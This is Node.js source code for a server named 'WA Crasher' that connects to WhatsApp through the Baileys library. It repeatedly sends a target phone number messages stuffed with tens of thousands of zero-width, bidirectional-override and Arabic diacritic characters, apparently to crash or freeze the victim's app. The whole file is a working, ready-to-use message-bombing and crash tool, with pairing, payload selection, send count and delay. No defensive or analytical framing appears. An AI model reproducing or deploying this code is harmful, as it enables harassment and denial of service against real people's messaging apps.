const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const cors = require('cors');

const app = express();
app.use(cors());
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

let sock = null;
let isReady = false;

const PAYLOADS = {
    0: '\u200B\u200C\u200D\uFEFF\u2060\u2063'.repeat(5000),
    1: '\u202E\u202D\u2066\u2067\u2068\u2069'.repeat(5000),
    2: 'ًٌٍَُِّْٕٓٔ'.repeat(5000),
    3: '\u200B'.repeat(20000)
};

async function connectWA() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    sock = makeWASocket({ auth: state, browser: ['WA Crasher', 'Chrome', '1.0'] });

    sock.ev.on('connection.update', (update) => {
        const { connection, qr } = update;
        if (qr) { io.emit('qr', qr); }
        if (connection === 'open') { isReady = true; io.emit('ready'); }
        if (connection === 'close') { isReady = false; io.emit('disconnected'); }
    });
    sock.ev.on('creds.update', saveCreds);
}

io.on('connection', (socket) => {
    socket.on('requestPairing', async (num) => {
        try { const code = await sock.requestPairingCode(num); socket.emit('pairingCode', code); }
        catch(e) { socket.emit('pairingError', e.message); }
    });

    socket.on('send', async (data) => {
        if (!isReady) { socket.emit('log', { type: 'err', msg: 'WA belum terhubung!' }); return; }
        const jid = data.target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const payload = PAYLOADS[data.payloadIdx] || PAYLOADS[0];
        for (let i = 0; i < data.count; i++) {
            try {
                await sock.sendMessage(jid, { text: payload });
                socket.emit('log', { type: 'ok', msg: `[${i+1}/${data.count}] ✅` });
            } catch(e) {
                socket.emit('log', { type: 'err', msg: e.message }); break;
            }
            socket.emit('progress', { current: i+1, total: data.count });
            if (i < data.count - 1) await new Promise(r => setTimeout(r, data.delay || 800));
        }
        socket.emit('done');
    });
});

connectWA();
server.listen(process.env.PORT || 3000, () => console.log('Running'));